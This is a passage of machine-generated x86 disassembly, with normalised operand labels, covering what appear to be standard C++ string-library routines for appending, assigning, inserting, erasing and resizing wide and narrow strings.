pop ebp
retn 0x4
sub_4021dc
push ebp
mov ebp esp
push esi
mov esi ecx
or eax 0xffffffff
mov ecx [ esi + 0x10 ]
push edi
mov edi [ ebp + 0x8 ]
sub eax ecx
cmp eax edi
jbe r-xdata
push r--data
call sub_40e036
test edi edi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
push ebx
lea ebx [ ecx + edi ]
push 0x0
push ebx
mov ecx esi
call sub_4026e7
test al al
je r-xdata
pop ebx
push [ ebp + 0xc ]
mov ecx esi
push edi
push [ esi + 0x10 ]
call sub_40269a
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] ebx
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
xor ecx ecx
mov [ eax + ebx * 2 ] cx
sub_40223f
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov edi [ ebx + 0x10 ]
mov esi ecx
cmp edi eax
jb r-xdata
push r--data
call sub_40e064
sub edi eax
cmp [ ebp + 0x10 ] edi
cmovb edi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
push 0x0
push edi
call sub_4026e7
test al al
je r-xdata
add eax edi
push eax
call sub_4025e7
mov eax [ ebp + 0xc ]
push eax
push 0x0
mov ecx esi
call sub_40261a
jmp r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ ebx + 0x14 ] 0x8
jb r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov ebx [ ebx ]
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax [ ebp + 0xc ]
push edi
lea edx [ ebx + eax * 2 ]
call sub_40104f
cmp [ esi + 0x14 ] 0x8
pop ecx
mov [ esi + 0x10 ] edi
jb r-xdata
xor ecx ecx
mov [ eax + edi * 2 ] cx
sub_4022ce
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
mov ecx edi
call sub_40102f
push edi
mov ecx esi
mov ebx eax
call sub_402967
test al al
je r-xdata
push 0x0
push ebx
mov ecx esi
call sub_4026e7
test al al
je r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
sub edi eax
push ebx
sar edi 0x1
push edi
push esi
mov ecx esi
call sub_40223f
mov esi eax
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
push ebx
mov edx edi
call sub_40104f
cmp [ esi + 0x14 ] 0x8
pop ecx
mov [ esi + 0x10 ] ebx
jb r-xdata
xor ecx ecx
mov [ eax + ebx * 2 ] cx
sub_40234d
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x10 ] 0x0
push edi
mov edi ecx
jne r-xdata
push ebx
mov ebx [ edi + 0x10 ]
push esi
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
or eax 0xffffffff
cmp [ ebp + 0x10 ] ebx
ja r-xdata
pop edi
leave
retn 0xc
xor eax eax
inc eax
sub eax [ ebp + 0x10 ]
add ebx eax
cmp [ edi + 0x14 ] 0x8
jb r-xdata
mov eax edi
mov [ ebp - 0x4 ] edi
mov eax [ edi ]
jmp r-xdata
xor esi esi
mov esi eax
mov eax [ ebp + 0x8 ]
mov ecx ebx
movzx eax [ eax ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
push [ ebp + 0x10 ]
mov edx [ ebp + 0x8 ]
mov ecx esi
call sub_401000
pop ecx
test eax eax
je r-xdata
test esi esi
je r-xdata
add esi 0x2
dec ecx
jne r-xdata
test ebx ebx
je r-xdata
cmp [ edi + 0x14 ] 0x8
jb r-xdata
mov ecx esi
sub ecx [ ebp - 0x4 ]
or eax 0xffffffff
sar ecx 0x1
sub eax ecx
add ebx eax
lea eax [ esi + 0x2 ]
cmp [ esi ] ax
je r-xdata
sub esi edi
sar esi 0x1
mov eax esi
jmp r-xdata
mov edi [ edi ]
pop esi
pop ebx
sub_4023e7
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi ecx
je r-xdata
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] 0x7
xor eax eax
mov [ esi + edi * 2 ] ax
pop edi
pop esi
pop ebp
retn 0x8
cmp [ esi + 0x14 ] 0x8
jb r-xdata
push ebx
mov ebx [ esi ]
test edi edi
je r-xdata
push ebx
call j_sub_40e8f2#2
pop ecx
pop ebx
push edi
mov edx ebx
call sub_40104f
pop ecx
sub_40242b
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push ebx
mov esi ecx
call sub_402846
test al al
je r-xdata
push edi
mov edi [ ebp + 0xc ]
push 0x0
push edi
mov ecx esi
call sub_4027e3
test al al
je r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov eax esi
pop edi
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
pop esi
pop ebx
pop ebp
retn 0x8
push [ ebp + 0xc ]
sub ebx eax
push ebx
push esi
mov ecx esi
call sub_40274f
jmp r-xdata
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
push edi
push ebx
push eax
call sub_410100
add esp 0xc
test edi edi
je r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov [ eax + edi ] 0x0
sub_4024a4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
mov eax [ edi + 0x10 ]
mov ecx [ ebp + 0xc ]
cmp eax ecx
jb r-xdata
push r--data
call sub_40e064
mov ebx [ ebp + 0x10 ]
sub eax ecx
mov ecx [ esi + 0x10 ]
cmp eax ebx
cmovb ebx eax
or eax 0xffffffff
sub eax ecx
mov [ ebp + 0x8 ] ecx
cmp eax ebx
jbe r-xdata
push r--data
call sub_40e036
test ebx ebx
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
lea eax [ ecx + ebx ]
push 0x0
push eax
mov ecx esi
call sub_4026e7
test al al
je r-xdata
cmp [ edi + 0x14 ] 0x8
jb r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov edi [ edi ]
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax [ ebp + 0xc ]
push ebx
lea edx [ edi + eax * 2 ]
mov eax [ esi + 0x10 ]
lea ecx [ ecx + eax * 2 ]
call sub_40104f
pop ecx
mov ecx [ ebp + 0x8 ]
add ecx ebx
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] ecx
jb r-xdata
xor edx edx
mov [ eax + ecx * 2 ] dx
sub_402546
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
mov esi ecx
call sub_402967
test al al
je r-xdata
mov ecx [ esi + 0x10 ]
or eax 0xffffffff
push ebx
mov ebx [ ebp + 0xc ]
sub eax ecx
cmp eax ebx
jbe r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
push r--data
call sub_40e036
test ebx ebx
je r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
pop ebx
lea eax [ ecx + ebx ]
push 0x0
push eax
mov ecx esi
mov [ ebp + 0xc ] eax
call sub_4026e7
test al al
je r-xdata
pop edi
pop esi
pop ebp
retn 0x8
push [ ebp + 0xc ]
sub edi eax
sar edi 0x1
push edi
push esi
mov ecx esi
call sub_4024a4
jmp r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax [ esi + 0x10 ]
push ebx
lea ecx [ ecx + eax * 2 ]
mov edx edi
call sub_40104f
cmp [ esi + 0x14 ] 0x8
pop ecx
mov ecx [ ebp + 0xc ]
mov [ esi + 0x10 ] ecx
jb r-xdata
xor edx edx
mov [ eax + ecx * 2 ] dx
sub_4025e7
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ ecx + 0x10 ] eax
jb r-xdata
push r--data
call sub_40e064
cmp [ ecx + 0x14 ] 0x8
mov [ ecx + 0x10 ] eax
jb r-xdata
mov edx ecx
mov edx [ ecx ]
jmp r-xdata
push esi
xor esi esi
mov [ edx + eax * 2 ] si
mov eax ecx
pop esi
pop ebp
retn 0x4
sub_40261a
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push ebx
push esi
mov esi ecx
push edi
mov edi [ esi + 0x10 ]
cmp edi edx
jb r-xdata
push r--data
call sub_40e064
mov ebx [ ebp + 0xc ]
mov eax edi
sub eax edx
cmp eax ebx
ja r-xdata
test ebx ebx
je r-xdata
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edx
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
xor ecx ecx
mov [ eax + edx * 2 ] cx
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
lea ecx [ eax + edx * 2 ]
sub edi ebx
mov eax edi
sub eax edx
push eax
lea edx [ ecx + ebx * 2 ]
call sub_40106c
cmp [ esi + 0x14 ] 0x8
pop ecx
mov [ esi + 0x10 ] edi
jb r-xdata
xor ecx ecx
mov [ eax + edi * 2 ] cx
sub_40269a
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
cmp eax 0x1
jne r-xdata
cmp [ ecx + 0x14 ] 0x8
jb r-xdata
cmp [ ecx + 0x14 ] 0x8
jb r-xdata
push edi
lea edi [ ecx + edx * 2 ]
test eax eax
je r-xdata
mov ecx [ ecx ]
mov ax [ ebp + 0x10 ]
mov [ ecx + edx * 2 ] ax
jmp r-xdata
mov ecx [ ecx ]
pop edi
mov ecx eax
mov eax [ ebp + 0x10 ]
movzx edx ax
mov eax edx
shl edx 0x10
or eax edx
shr ecx 0x1
[ edi ]
adc ecx ecx
[ edi ]
pop ebp
retn 0xc
sub_4026e7
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp esi 0x7ffffffe
ja r-xdata
push r--data
call sub_40e036
cmp [ ecx + 0x14 ] esi
jae r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
push [ ecx + 0x10 ]
push esi
call sub_402881
jmp r-xdata
test esi esi
jne r-xdata
cmp esi 0x8
jae r-xdata
xor eax eax
cmp eax esi
sbb eax eax
neg eax
pop esi
pop ebp
retn 0x8
and [ ecx + 0x10 ] esi
cmp [ ecx + 0x14 ] 0x8
jb r-xdata
mov eax [ ecx + 0x10 ]
cmp esi eax
cmovb eax esi
push eax
push 0x1
call sub_4023e7
jmp r-xdata
xor eax eax
mov [ ecx ] ax
mov ecx [ ecx ]
sub_40274f
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov edi [ ebx + 0x10 ]
mov esi ecx
cmp edi eax
jb r-xdata
push r--data
call sub_40e064
sub edi eax
cmp [ ebp + 0x10 ] edi
cmovb edi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
push 0x0
push edi
call sub_4027e3
test al al
je r-xdata
add eax edi
push eax
call sub_4029a3
mov eax [ ebp + 0xc ]
push eax
push 0x0
mov ecx esi
call sub_4029d2
jmp r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ ebx + 0x14 ] 0x10
jb r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov ebx [ ebx ]
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
mov eax [ ebp + 0xc ]
push edi
add eax ebx
push eax
push ecx
call sub_410100
add esp 0xc
test edi edi
je r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov [ eax + edi ] 0x0
sub_4027e3
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp esi 0xfffffffe
ja r-xdata
push r--data
call sub_40e036
cmp [ ecx + 0x14 ] esi
jae r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
push [ ecx + 0x10 ]
push esi
call sub_402a54
jmp r-xdata
test esi esi
jne r-xdata
cmp esi 0x10
jae r-xdata
xor eax eax
cmp eax esi
sbb eax eax
neg eax
pop esi
pop ebp
retn 0x8
and [ ecx + 0x10 ] esi
cmp [ ecx + 0x14 ] 0x10
jb r-xdata
mov eax [ ecx + 0x10 ]
cmp esi eax
cmovb eax esi
push eax
push 0x1
call sub_40214c
jmp r-xdata
mov [ ecx ] 0x0
mov ecx [ ecx ]
sub_402846
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
test edx edx
je r-xdata
xor al al
cmp [ ecx + 0x14 ] 0x10
jb r-xdata
mov eax ecx
mov eax [ ecx ]
jmp r-xdata
cmp [ ecx + 0x14 ] 0x10
push esi
jb r-xdata
cmp edx eax
jb r-xdata
mov esi ecx
mov esi [ ecx ]
jmp r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ecx + 0x10 ]
add eax esi
pop esi
cmp eax edx
jbe r-xdata
pop ebp
retn 0x4
sub_402881
push 0xc
mov eax sub_41d1ef
call sub_4108d1
mov esi ecx
mov [ ebp - 0x18 ] esi
mov edi [ ebp + 0x8 ]
or edi 0x7
cmp edi 0x7ffffffe
jbe r-xdata
xor edx edx
mov eax edi
mov [ ebp - 0x14 ] 0x3
div [ ebp - 0x14 ]
mov ebx [ esi + 0x14 ]
mov ecx ebx
shr ecx 0x1
cmp ecx eax
jbe r-xdata
mov edi [ ebp + 0x8 ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
lea eax [ edi + 0x1 ]
push eax
call sub_402b5d
jmp r-xdata
mov edi 0x7ffffffe
mov eax edi
sub eax ecx
cmp ebx eax
ja r-xdata
mov ebx [ ebp + 0xc ]
mov [ ebp - 0x14 ] eax
test ebx ebx
je r-xdata
lea edi [ ecx + ebx ]
push 0x0
push 0x1
mov ecx esi
call sub_4023e7
test esi esi
je r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov [ esi + 0x14 ] edi
mov [ esi + 0x10 ] ebx
cmp edi 0x8
jb r-xdata
mov eax [ ebp - 0x14 ]
mov [ esi ] eax
mov edx esi
mov edx [ esi ]
jmp r-xdata
xor eax eax
mov [ esi + ebx * 2 ] ax
call sub_410836
retn 0x8
mov esi [ esi ]
push ebx
mov ecx eax
call sub_40104f
pop ecx
sub_402967
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
test edx edx
je r-xdata
xor al al
cmp [ ecx + 0x14 ] 0x8
jb r-xdata
mov eax ecx
mov eax [ ecx ]
jmp r-xdata
cmp [ ecx + 0x14 ] 0x8
push esi
jb r-xdata
cmp edx eax
jb r-xdata
mov esi ecx
mov esi [ ecx ]
jmp r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ecx + 0x10 ]
lea eax [ esi + eax * 2 ]
pop esi
cmp eax edx
jbe r-xdata
pop ebp
retn 0x4
sub_4029a3
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ ecx + 0x10 ] eax
jb r-xdata
push r--data
call sub_40e064
cmp [ ecx + 0x14 ] 0x10
mov [ ecx + 0x10 ] eax
jb r-xdata
mov edx ecx
mov edx [ ecx ]
jmp r-xdata
mov [ edx + eax ] 0x0
mov eax ecx
pop ebp
retn 0x4
sub_4029d2
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
push edi
mov edi [ esi + 0x10 ]
cmp edi ecx
jb r-xdata
push r--data
call sub_40e064
mov edx [ ebp + 0xc ]
mov eax edi
sub eax ecx
cmp eax edx
ja r-xdata
test edx edx
je r-xdata
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] ecx
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov [ eax + ecx ] 0x0
jmp r-xdata
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
pop ebx
jb r-xdata
push eax
lea eax [ ebx + edx ]
push eax
push ebx
call sub_40e0b0
add esp 0xc
sub edi edx
push ebx
lea ebx [ eax + ecx ]
mov eax edi
sub eax ecx
je r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov [ eax + edi ] 0x0
sub_402a54
push 0xc
mov eax sub_41d1d4
call sub_4108d1
mov esi ecx
mov [ ebp - 0x18 ] esi
mov edi [ ebp + 0x8 ]
or edi 0xf
cmp edi 0xfffffffe
jbe r-xdata
xor edx edx
mov eax edi
mov [ ebp - 0x14 ] 0x3
div [ ebp - 0x14 ]
mov ebx [ esi + 0x14 ]
mov ecx ebx
shr ecx 0x1
cmp ecx eax
jbe r-xdata
mov edi [ ebp + 0x8 ]
jmp r-xdata
xor ebx ebx
lea eax [ edi + 0x1 ]
push ebx
push eax
mov [ ebp - 0x4 ] ebx
call sub_402c48
pop ecx
pop ecx
mov ecx eax
mov [ ebp - 0x14 ] eax
jmp sub_402ae6
push 0xfffffffe
pop eax
sub eax ecx
cmp ebx eax
ja r-xdata
push 0xfffffffe
pop edi
lea edi [ ecx + ebx ]
jmp r-xdata
sub_402ab7
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] esp
mov [ ebp + 0x8 ] eax
inc eax
push 0x0
push eax
mov [ ebp - 0x4 ] 0x2
call sub_402c48
pop ecx
mov [ ebp - 0x14 ] eax
pop ecx
mov eax r-xdata
retn
sub_402ae6
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov eax [ ebp - 0x14 ]
mov [ esi ] eax
mov eax [ ebp + 0xc ]
mov [ esi + 0x14 ] edi
mov [ esi + 0x10 ] eax
cmp edi 0x10
jb r-xdata
push [ esi ]
call j_sub_40e8f2#2
pop ecx
mov edx esi
mov edx [ esi ]
jmp r-xdata
mov [ esi + eax ] bl
call sub_410836
retn 0x8
mov esi [ esi ]
push eax
push edx
push ecx
call sub_410100
add esp 0xc
test eax eax
je r-xdata
sub_402b36
mov esi [ ebp - 0x18 ]
cmp [ esi + 0x14 ] 0x10
jb r-xdata
xor ebx ebx
push ebx
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
push ebx
mov [ esi ] bl
call sub_4107db
int3
push [ esi ]
call j_sub_40e8f2#2
pop ecx
sub_402b5d
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
test eax eax
je r-xdata
mov eax ecx
pop ebp
retn 0x4
cmp eax 0x7fffffff
ja r-xdata
call sub_40e005
add eax eax
push eax
call sub_40e73f
pop ecx
mov ecx eax
test ecx ecx
je r-xdata
sub_402b8b
push esi
push edi
mov esi ecx
mov edi r--data
mov ecx edi
call sub_40102f
push eax
push edi
push [ esi + 0x10 ]
push ecx
mov ecx esi
call sub_402ee3
neg eax
sbb eax eax
pop edi
inc eax
pop esi
retn
sub_402bb0
push 0x8
mov eax sub_41d53b
call sub_410868
mov esi edx
mov edi ecx
mov [ ebp - 0x14 ] edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
xor eax eax
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] ebx
mov [ edi ] ax
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x10 ] 0x1
call sub_40102f
add eax [ esi + 0x10 ]
mov ecx edi
push eax
call sub_402c6f
push 0xffffffff
push ebx
push esi
mov ecx edi
call sub_4024a4
mov ecx [ ebp + 0x8 ]
call sub_40102f
push eax
push [ ebp + 0x8 ]
mov ecx edi
call sub_402546
mov eax edi
call sub_410836
retn
sub_402c1a
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push esi
push edi
mov esi edx
push esi
mov edi ecx
call sub_401089
pop ecx
push eax
push esi
push ecx
mov ecx [ ebp + 0x8 ]
call sub_402ca8
push eax
mov ecx edi
call sub_402019
mov eax edi
pop edi
pop esi
leave
retn
sub_402c48
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
test eax eax
je r-xdata
mov eax ecx
pop ebp
retn
cmp eax 0xffffffff
ja r-xdata
jmp sub_40e005
push eax
call sub_40e73f
pop ecx
mov ecx eax
test ecx ecx
jne r-xdata
sub_402c6f
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
push edi
mov edi [ esi + 0x10 ]
cmp edi eax
ja r-xdata
pop edi
pop esi
pop ebp
retn 0x4
cmp [ esi + 0x14 ] eax
je r-xdata
push 0x1
push eax
call sub_4026e7
test al al
je r-xdata
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
xor eax eax
mov [ esi + edi * 2 ] ax
mov esi [ esi ]
sub_402ca8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
push ebx
mov esi ecx
call sub_402846
test al al
je r-xdata
mov ecx [ esi + 0x10 ]
or eax 0xffffffff
push edi
mov edi [ ebp + 0x10 ]
sub eax ecx
cmp eax edi
jbe r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
push r--data
call sub_40e036
test edi edi
je r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
pop edi
lea eax [ ecx + edi ]
push 0x0
push eax
mov ecx esi
mov [ ebp + 0x10 ] eax
call sub_4027e3
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn 0xc
push [ ebp + 0x10 ]
sub ebx eax
push ebx
push esi
push ecx
mov ecx esi
call sub_402f28
jmp r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
push [ esi + 0x10 ]
add eax edi
push ecx
push eax
call sub_40e0b0
add esp 0xc
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp [ esi + 0x14 ] 0x10
mov ecx [ ebp + 0x10 ]
mov [ esi + 0x10 ] ecx
jb r-xdata
push edi
push ebx
push eax
call sub_410100
add esp 0xc
test edi edi
je r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov [ eax + ecx ] 0x0
sub_402d76
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0x10 ]
push esi
push ebx
mov esi ecx
call sub_402967
test al al
je r-xdata
mov ecx [ esi + 0x10 ]
mov eax [ ebp + 0x8 ]
cmp ecx eax
jb r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
push r--data
call sub_40e064
mov edx ecx
sub edx eax
push edi
mov edi [ ebp + 0xc ]
cmp edx edi
cmovb edi edx
or eax 0xffffffff
sub eax [ ebp + 0x14 ]
sub ecx edi
cmp eax ecx
jbe r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
push r--data
call sub_40e036
mov ecx [ ebp + 0x14 ]
sub edx edi
mov [ ebp - 0x4 ] edx
cmp ecx edi
jae r-xdata
pop esi
pop ebx
leave
retn 0x10
push [ ebp + 0x14 ]
sub ebx eax
sar ebx 0x1
push ebx
push esi
push [ ebp + 0xc ]
mov ecx esi
push [ ebp + 0x8 ]
call sub_40303b
jmp r-xdata
test ecx ecx
jne r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax [ esi + 0x10 ]
sub eax edi
add eax ecx
push 0x0
push eax
mov ecx esi
mov [ ebp + 0x10 ] eax
call sub_4026e7
test al al
je r-xdata
test edi edi
je r-xdata
mov [ ebp + 0xc ] esi
mov eax [ esi ]
mov [ ebp + 0xc ] eax
jmp r-xdata
mov eax esi
pop edi
mov ecx [ ebp + 0x14 ]
cmp edi ecx
jae r-xdata
mov [ ebp + 0x10 ] esi
mov eax [ esi ]
mov [ ebp + 0x10 ] eax
jmp r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov edi [ ebp + 0x8 ]
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax [ ebp + 0x8 ]
push edx
mov edx [ ebp + 0xc ]
add eax edi
lea edx [ edx + eax * 2 ]
mov eax [ ebp + 0x8 ]
add eax ecx
mov ecx [ ebp + 0x10 ]
lea ecx [ ecx + eax * 2 ]
call sub_40106c
pop ecx
mov ecx [ ebp + 0x14 ]
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
push ecx
lea ecx [ eax + edi * 2 ]
mov edx ebx
call sub_40104f
cmp [ esi + 0x14 ] 0x8
mov eax [ ebp + 0x10 ]
pop ecx
mov [ esi + 0x10 ] eax
jb r-xdata
mov [ ebp + 0xc ] esi
mov eax [ esi ]
mov [ ebp + 0xc ] eax
jmp r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
xor edx edx
mov [ ecx + eax * 2 ] dx
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax [ ebp + 0x8 ]
push [ ebp - 0x4 ]
add eax edi
mov edi [ ebp + 0x8 ]
lea edx [ edx + eax * 2 ]
lea eax [ edi + ecx ]
mov ecx [ ebp + 0xc ]
lea ecx [ ecx + eax * 2 ]
call sub_40106c
pop ecx
mov ecx [ ebp + 0x14 ]
jmp r-xdata
sub_402ee3
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0xc ]
cmp [ ecx + 0x10 ] edi
cmovb edi [ ecx + 0x10 ]
cmp [ ecx + 0x14 ] 0x8
jb r-xdata
mov eax [ ebp + 0x14 ]
mov edx [ ebp + 0x10 ]
cmp edi eax
cmovb eax edi
push eax
call sub_401000
pop ecx
xor ecx ecx
cmp edi [ ebp + 0x14 ]
setne cl
or edx 0xffffffff
cmp edi [ ebp + 0x14 ]
pop edi
cmovb ecx edx
test eax eax
cmovne ecx eax
mov eax ecx
pop ebp
retn 0x10
mov ecx [ ecx ]
sub_402f28
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov eax [ ebx + 0x10 ]
mov esi ecx
mov ecx [ ebp + 0x10 ]
push edi
cmp eax ecx
jb r-xdata
push r--data
call sub_40e064
mov edi [ ebp + 0x14 ]
sub eax ecx
mov ecx [ esi + 0x10 ]
cmp eax edi
cmovb edi eax
or eax 0xffffffff
sub eax ecx
cmp eax edi
jbe r-xdata
push r--data
call sub_40e036
test edi edi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
lea eax [ ecx + edi ]
push 0x0
push eax
mov ecx esi
mov [ ebp + 0xc ] eax
call sub_4027e3
test al al
je r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
cmp esi ebx
jne r-xdata
push [ esi + 0x10 ]
add eax edi
push ecx
push eax
call sub_40e0b0
add esp 0xc
cmp [ esi + 0x10 ] 0x0
je r-xdata
cmp [ ebx + 0x14 ] 0x10
jb r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov ebx [ ebx ]
mov ebx esi
mov ebx [ esi ]
jmp r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
cmp [ esi + 0x14 ] 0x10
mov ecx [ ebp + 0xc ]
mov [ esi + 0x10 ] ecx
jb r-xdata
mov eax [ ebp + 0x10 ]
push edi
add eax ebx
push eax
push ecx
call sub_410100
test edi edi
je r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
lea eax [ ecx + edi ]
cmovne ecx eax
push edi
add ecx ebx
push ecx
push edx
call sub_40e0b0
jmp r-xdata
test edi edi
je r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
add esp 0xc
mov [ eax + ecx ] 0x0
sub_40303b
push ebp
mov ebp esp
push ecx
push ecx
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
push edi
mov edx [ esi + 0x10 ]
cmp edx ebx
jb r-xdata
push r--data
call sub_40e064
mov edi [ ebp + 0x10 ]
mov ecx [ ebp + 0x14 ]
mov eax [ edi + 0x10 ]
cmp eax ecx
jb r-xdata
mov edi edx
sub edi ebx
mov [ ebp - 0x4 ] edi
mov edi [ ebp + 0xc ]
cmp [ ebp - 0x4 ] edi
cmovb edi [ ebp - 0x4 ]
sub eax ecx
mov [ ebp + 0xc ] edi
mov edi [ ebp + 0x18 ]
cmp eax edi
cmovb edi eax
mov eax edx
sub eax [ ebp + 0xc ]
mov [ ebp + 0x18 ] edi
mov [ ebp - 0x8 ] eax
or eax 0xffffffff
sub eax edi
mov edi [ ebp + 0x10 ]
